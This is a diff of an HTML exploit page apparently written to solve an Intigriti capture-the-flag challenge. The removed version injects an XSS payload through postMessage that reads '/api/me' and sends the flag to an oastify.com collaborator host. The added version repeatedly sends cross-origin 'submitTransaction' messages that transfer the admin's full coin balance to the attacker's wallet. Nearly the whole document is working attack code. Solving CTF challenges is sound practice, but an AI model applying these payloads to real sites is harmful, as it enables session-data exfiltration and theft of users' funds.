@@ -1,37 +1,37 @@
 <!DOCTYPE html>
 <html>
 <body>
-<script>
-    // The target with the Admin's currency
-    const target = 'https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1';
-    const collab = 'https://b4gofscv4huzfnm16g1zxfipfgl79zxo.oastify.com';
-    
-    // The XSS payload: No spaces, no quotes, maximum speed.
-    const xss = `"><svg/onload=fetch('/api/me').then(r=>r.json()).then(d=>fetch('${collab}/?f='+d.flag))> `;
+    <script>
+        const COLLAB = 'https://b4gofscv4huzfnm16g1zxfipfgl79zxo.oastify.com';
+        const TARGET = 'https://challenge-0126.intigriti.io';
+        // Put YOUR wallet address here from your dashboard
+        const MY_WALLET = '1f3d796f822b439dc366e4de68133f13c2'; 
 
-    // Open the target
-    const win = window.open(target);
+        // Step 1: Open the target (Ensures cookies are sent)
+        const win = window.open(`${TARGET}/checkout.html?currency=1337COIN&price=1`);
 
-    // Instead of a long timeout, we spam the postMessage as fast as the CPU allows
-    // This ensures we hit the 'init' state of the checkout page immediately.
-    const heist = setInterval(() => {
-        if (win) {
-            win.postMessage({
-                type: 'submitTransaction',
-                transaction: {
-                    toAddress: xss,
-                    currency: '1337COIN',
-                    amount: 0.00000001
-                }
-            }, '*');
-        }
-    }, 100);
+        // Step 2: Spam the Transfer Message
+        let count = 0;
+        const spammer = setInterval(() => {
+            if (win) {
+                win.postMessage({
+                    type: 'submitTransaction',
+                    transaction: {
+                        currency: '1337COIN',
+                        amount: 100000000, // The full Admin balance
+                        toAddress: MY_WALLET 
+                    }
+                }, '*');
+            }
+            count++;
+            if (count > 30) clearInterval(spammer);
+        }, 3000);
 
-    // Redirect the top window to the trigger page after 5 seconds
-    setTimeout(() => {
-        clearInterval(heist);
-        window.location.href = 'https://challenge-0126.intigriti.io/marketwatch.html';
-    }, 5000);
-</script>
+        // Step 3: Confirmation Redirect
+        // After the transfer, check your own dashboard
+        setTimeout(() => {
+            window.location.href = `${TARGET}/dashboard.html`;
+        }, 10000);
+    </script>
 </body>
 </html>
